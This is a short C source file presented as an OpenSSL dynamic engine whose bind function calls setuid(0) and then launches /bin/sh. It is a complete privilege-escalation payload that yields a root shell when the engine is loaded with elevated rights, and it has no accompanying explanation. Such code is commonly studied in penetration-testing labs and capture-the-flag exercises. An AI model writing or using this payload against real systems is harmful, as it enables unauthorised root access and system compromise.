#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    system("/bin/sh");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()